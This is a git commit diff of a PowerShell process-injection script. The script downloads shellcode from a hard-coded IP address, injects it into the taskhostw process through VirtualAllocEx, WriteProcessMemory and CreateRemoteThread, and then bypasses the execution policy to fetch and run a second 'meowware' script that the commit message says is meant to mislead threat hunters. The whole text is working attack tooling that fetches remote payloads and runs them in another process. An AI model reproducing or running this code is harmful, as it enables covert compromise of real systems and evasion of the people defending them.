9b3679fcf6f1d4d42c1ad872e606d8521c73ebd6
Indigo-10 <80222231+Indigo-10@users.noreply.github.com>
2024-11-03 19:17:31 -0500

    Update ProcessInject.ps1
    Added meowware, which is supposed to throw threat hunters off, believing meowware.exe is potentially the beacon

--- ProcessInject.ps1
+++ ProcessInject.ps1
@@ -19,7 +19,8 @@ public class Win32
 "@
 Add-Type $Win32
 
-$shellcode = (New-Object System.Net.WebClient).DownloadData("http://104.38.8.228:8000/ARTIFICIAL_WORK")
+# Downlad shellcode from stage listener
+$shellcode = (New-Object System.Net.WebClient).DownloadData("http://104.38.66.28:80/balls.woff")
 if ($shellcode -eq $null) {Exit};
 $size = New-Object System.UIntPtr($shellcode.length)
 
@@ -27,23 +28,38 @@ $shellcodeHex = -join ($shellcode[0..([Math]::Min(63, $shellcode.Length - 1))] |
 Write-Host "Shellcode contents (hex): $shellcodeHex"
 
 #retreive process id
-$svchostProcess = Get-Process -Name notepad | Select-Object -First 1
+$svchostProcess = Get-Process -Name taskhostw | Select-Object -First 1
 $IdProcess = $svchostProcess.Id
 Write-Output "Injected into process ID: $IdProcess"
 
 #store process using openprocess and processid with full rights
 $process = [Win32]::OpenProcess(0x001FFFFF, $false, $IdProcess)	
 
+#Allocate size of shellcode to stored process memory
 $memAddr = [Win32]::VirtualAllocEx($process,[System.IntPtr]::Zero, $size, 0x00003000, 0x40)
 
-
+#Write shellcode to process memory
 $writtenBytes = [System.UIntPtr]::Zero
 [Win32]::WriteProcessMemory($process, $memAddr, $shellcode, [uint32]$size.ToUInt32(), [ref]$writtenBytes)
 
+#runs the shellcode alongside process
 $threadID = [System.IntPtr]::Zero
 [Win32]::CreateRemoteThread($process, [System.IntPtr]::Zero, 0, $memAddr, [System.IntPtr]::Zero, 0, [ref]$threadID)
 
+# Setting Execution Policy for the current process
+Set-ExecutionPolicy Bypass -Scope Process -Force
 
+# Download meowware troll script from server
+$meowwareUrl = "http://104.38.66.28:8000/meowware.ps1"  # Replace with your actual URL
+$meowwareScript = (New-Object System.Net.WebClient).DownloadString($meowwareUrl)
 
+if (-not $meowwareScript) {
+    Write-Host "Failed to download Meowware script."
+    Exit
+}
 
+# Use Invoke-Expression to execute the downloaded script
+Invoke-Expression $meowwareScript
 
+# Kill current process so it doesnt potenially hang and become a parent process of meowware
+Stop-Process -Id $PID
